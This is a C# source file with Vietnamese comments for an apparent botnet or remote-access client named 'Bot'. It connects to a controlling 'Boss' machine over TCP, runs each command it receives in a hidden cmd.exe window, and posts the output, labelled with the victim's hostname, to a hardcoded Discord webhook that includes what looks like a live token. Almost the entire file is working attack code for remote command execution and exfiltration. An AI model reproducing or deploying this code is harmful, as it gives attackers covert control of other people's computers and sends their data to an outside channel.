using System;
using System.IO;
using System.Net;
using System.Text;
using System.Net.Sockets;
using System.Collections.Specialized;
using System.Threading;
using System.Diagnostics;

public class Bot
{
    /// <summary>
    /// Hàm có chức năng tạo kết nối tới máy Boss
    /// Nhận dữ liệu từ máy Boss
    /// </summary>
    public static void Main()
    {
        try
        {
            TcpClient client = new TcpClient();

            // 1. Kết nối tới máy boss
            client.Connect("192.168.111.137", 9999);
            Stream stream = client.GetStream();

            var reader = new StreamReader(stream);
            while (true)
            {
                // 3. Nhận command từ máy boss
                string str = reader.ReadLine();
                Console.WriteLine(str);
                Thread send = new Thread(RunCMD);
                send.IsBackground = true;
                send.Start(str);

                //Nếu dữ liệu là chuỗi "BYE" thì ngưng nhận dữ liệu
                if (str.ToUpper() == "BYE")
                    break;
            }
            // 4. Đóng luồng nếu ngưng kết nối
            stream.Close();
            client.Close();
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex);
        }
    }


    /// <summary>
    /// Hàm có chức năng gửi dữ liệu lên Channel Discord
    /// </summary>
    /// <param name="mess">nội dung cần gửi</param>
    public static void SendWebHook(string mess)
    {
        //Lấy tên PC để đặt tên cho Bot
        string username = Dns.GetHostName();
        //Địa chỉ Channel của Discord
        Uri URL = new Uri("https://discord.com/api/webhooks/851566663941357578/xuHLbJ49A-JfziMmw8Z1MvwyJ6E85wg7SVKdthUILSuaOUMiO6756nCDq2v8hSEXwMwD");
        //Dữ liệu gửi lên Channel dạng Json
        var pairs = new NameValueCollection()
        {
            {
                "username",
                username
            },
            {
                "content",
                mess
            }
        };
        //Gửi dữ liệu
        using (WebClient webClient = new WebClient())
        {
            webClient.UploadValuesAsync(URL, pairs);
        }
    }

    /// <summary>
    /// Hàm có chức năng thực thi command
    /// </summary>
    /// <param name="text"></param>
    public static void RunCMD(object text)
    {
        string command = text.ToString();
        Process cmd = new Process();
        cmd.StartInfo.FileName = "cmd.exe";
        cmd.StartInfo.RedirectStandardInput = true;
        cmd.StartInfo.RedirectStandardOutput = true;
        cmd.StartInfo.CreateNoWindow = true;
        cmd.StartInfo.UseShellExecute = false;
        cmd.Start();

        cmd.StandardInput.WriteLine(command);
        cmd.StandardInput.Flush();
        cmd.StandardInput.Close();
        cmd.WaitForExit();
        SendWebHook(cmd.StandardOutput.ReadToEnd());
    }
}